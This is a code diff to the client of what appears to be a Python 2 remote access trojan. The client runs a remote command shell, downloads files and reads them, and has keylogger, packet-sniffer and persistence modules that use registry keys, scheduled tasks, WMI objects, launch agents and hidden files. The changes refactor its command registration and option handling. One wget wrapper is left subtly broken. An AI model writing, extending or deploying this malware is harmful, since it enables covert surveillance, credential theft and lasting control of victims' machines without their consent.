@@ -80,27 +80,32 @@ else:
 
 
 class Client(object):
+    
     global __modules__
+    global __command__
+    __command__ = {}
     __modules__ = {}
+    
     def __init__(self, *args, **kwargs):
+        self._setup(**kwargs)
         self.mode       = 0
         self.exit       = 0
         self.threads    = {}
-        self._setup(**kwargs)
         self.info       = self._info()
         self.logger     = self._logger()
         self.modules    = self._modules()
         self.commands   = self._commands()
         self.result     = self._result()
 
-# ----------------- PRIVATE FUNCTIONS --------------------------
+# ----------------- private functions --------------------------
+
     def _modules(self): return {mod: getattr(self, mod) for mod in __modules__}
 
     def _wget(self, target): return urlretrieve(target)[0]
     
     def _cat(self,filename): return open(filename).read(4000) 
     
-    def _ls(self, path='.'): return '\n'.join(os.listdir(path))
+    def _ls(self, *path): return '\n'.join(os.listdir(path[0])) if path else '\n'.join(os.listdir('.'))
 
     def _result(self): return {module:{} for module in self.modules}
 
@@ -108,7 +113,7 @@ class Client(object):
 
     def _pad(self, s): return s + (AES.block_size - len(bytes(s)) % AES.block_size) * b'\0'
 
-    def _commands(self): return {cmd: getattr(self, cmd) for cmd in vars(self) if '_' not in cmd}
+    def _commands(self): return {cmd: getattr(self, cmd) for cmd in __command__}
     
     def _cd(self, pathname): return os.chdir(pathname) if os.path.isdir(pathname) else os.chdir('.')
 
@@ -327,51 +332,66 @@ class Client(object):
     def _use(self, module):
         try:
             getattr(self, module).im_func.status = True
-            return "'{}' enabled.".format(module.title())
+            return "{} enabled.".format(module.title())
         except Exception as e:
             return "Error: {}".format(str(e))
 
     def _stop(self, module):
         try:
             getattr(self, module).im_func.status = False
-            return "'{}' disabled.".format(module.title())
+            return "{} disabled.".format(module.title())
         except Exception as e:
             return "Error: {}".format(str(e))
 
-    def _options(self, module=None):
+    def _set(self, arg):
+        module, _, opt = arg.partition(' ')
+        option, _, val = opt.partition('=')
+        if not hasattr(self, module):
+            return "Module '{}' not found".format(module)
+        if val.lower() in ('1','true'):
+            val = True
+        elif val.lower() in ('0', 'false'):
+            val = False
+        elif val.isdigit():
+            val = int(val)
+        try:
+            getattr(self, module).options[option] = val
+        except Exception as e:
+            return 'Error: {}'.format(str(e))
+        return json.dumps(getattr(self, module).options, indent=2, separators=(',', ': '), sort_keys=True)
+        
+
+    def _options(self, *module):
         try:
             if not module:
                 modlist = [_ for _ in self.modules]
             else:
+                module = module[0]
                 if module not in self.modules:
                     return "'{}' is not a module".format(str(module))
-                modlist = [module]
-            return self._show({m: self.modules[m].options for m in modules})
+                else:
+                    modlist = [module]
+            return self._show({m: self.modules[m].options for m in modlist})
         except Exception as e:
             return 'Option error: {}'.format(str(e))
             
 
     def _show(self, target):
-        if target   == 'commands':
-            reults  = '\n'.join([i for i in vars(self) if '_' not in i])
-        elif target == 'modules':
-            results = '\n'.join([x for x in self.modules])
+        if target in ('commands','modules','jobs'):
+            results  = '\n'.join([i for i in getattr(self, target)])
         else:
+            dict_or_json = getattr(self, target) if type(target) is str else target
             try:
-                dict_or_json = target
-                try:
-                    results = json.dumps(dict_or_json, indent=2, separators=(',',': '), sort_keys=True)
-                except Exception as e:
-                    try:
-                        string_repr = repr(dict_or_json)
-                        string_repr = string_repr.replace('None', 'null').replace('True', 'true').replace('False', 'false').replace("u'", "'").replace("'", '"')
-                        string_repr = re.sub(r':(\s+)(<[^>]+>)', r':\1"\2"', string_repr)
-                        string_repr = string_repr.replace('(', '[').replace(')', ']')
-                        results     = json.dumps(json.loads(string_repr), indent=2, separators=(', ', ': '), sort_keys=True)
-                    except:
-                        results = repr(dict_or_json)
+                results = json.dumps(dict_or_json, indent=2, separators=(',',': '), sort_keys=True)
             except:
-                results = "'{}' not found".format(str(target))
+                try:
+                    string_repr = repr(dict_or_json)
+                    string_repr = string_repr.replace('None', 'null').replace('True', 'true').replace('False', 'false').replace("u'", "'").replace("'", '"')
+                    string_repr = re.sub(r':(\s+)(<[^>]+>)', r':\1"\2"', string_repr)
+                    string_repr = string_repr.replace('(', '[').replace(')', ']')
+                    results     = json.dumps(json.loads(string_repr), indent=2, separators=(', ', ': '), sort_keys=True)
+                except:
+                    results = repr(dict_or_json)
         return results
 
     def _ip(self):
@@ -465,26 +485,26 @@ class Client(object):
         return result
 
     def _run_modules(self):
-        for mod in self.modules:
-             if self.modules[mod].status and sys.platform in self.modules[mod].platforms and mod not in self.threads:
-                self.threads.update({mod: Thread(target=getattr(self, mod), name=mod)})
-        for job in self.threads:
-            if not self.threads[job].is_alive():
-                self.threads[job].start()
-        for task in self.threads:
+        for name, module in self.modules.items():
+             if module.status and sys.platform in module.platforms and name not in self.threads:
+                self.threads[name] = Thread(target=module, name=name)
+        for worker in self.threads.values():
+            if not worker.is_alive():
+                worker.start()
+        for task, worker in self.threads.items():
             if task not in ('keylogger','packetsniffer'):
-                self.threads[task].join()
+                worker.join()
         return self._show(self.result)
 
     def _shell(self):
         while True:
             if self.mode:
                 break
-            prompt = "[%d @_ {}]> ".format(os.getcwd())
+            prompt = "[%d @ {}]> ".format(os.getcwd())
             self._send(prompt, method='prompt')   
             data = self._receive()
             if data:
-                cmd, _, action = data.partition(' ')
+                cmd, _, action = bytes(data).partition(' ')
             else:
                 continue
             if cmd in self.commands:
@@ -913,14 +933,17 @@ class Client(object):
         while True:
             if self.exit:
                 break
-            dead_threads = [self.threads.pop(job, None) for job in self.threads if not self.threads[job].is_alive()]
-            for dead in dead_threads:
-                if self.__v__:
-                    print "Thread '{}' killed".format(dead.name)
-                del dead
-            time.sleep(5)
+            for job in self.threads:
+                if not self.threads[job].is_alive():
+                    task_done = self.threads.pop(job, None)
+                    del task_done
+            time.sleep(1)
 
-    def _module(fx, mx=__modules__):
+    def _command(fx, cmds=__command__):
+        __command__[fx.func_name] = fx
+        return fx
+
+    def _module(fx, cx=__command__, mx=__modules__):
         if fx.func_name is 'persistence':
             fx.platforms = ['win32','darwin']
             fx.options = {'methods': ['registry key', 'scheduled task', 'wmi object', 'startup file', 'hidden file'] if os.name is 'nt' else ['launch agent', 'hidden file']}
@@ -942,40 +965,60 @@ class Client(object):
             fx.options = {}
         fx.status = True if sys.platform in fx.platforms else False
         mx.update({fx.func_name: fx})
+        cx.update({fx.func_name: fx})
         return fx
 
-# ----------------- PUBLIC FUNCTIONS --------------------------
+# ------------------ Commands --------------------------
 
+    @_command
+    def set(self, x): return self._set(x)
+
+    @_command
+    def ls(self, *x): return self._ls(*x)
+
+    @_command
     def pwd(self): return os.getcwd()
     
+    @_command
     def kill(self): return self._kill()
     
+    @_command
     def admin(self): return self._admin()
     
+    @_command
     def start(self): return self._start()
     
+    @_command
     def shell(self): return self._shell()
     
+    @_command
     def new(self, x): return self._new(x)
 
+    @_command
     def show(self, x): return self._show(x)
     
+    @_command
     def run(self): return self._run_modules()
     
+    @_command
     def standby(self): return self._standby()
     
-    def options(self): return self._options()
+    @_command
+    def options(self,*arg): return self._options(*arg)
 
+    @_command
     def wget(self, target): return self._wget()
-    
-    def info(self): return self._show(self.info)
 
+    @_command
     def jobs(self): return self._show(self.threads)
     
+    @_command
     def use(self, module): return self._use(module)
 
+    @_command
     def stop(self, module): return self._stop(module)
 
+    @_command
     def results(self): return self._show(self.result)
     
     @_module
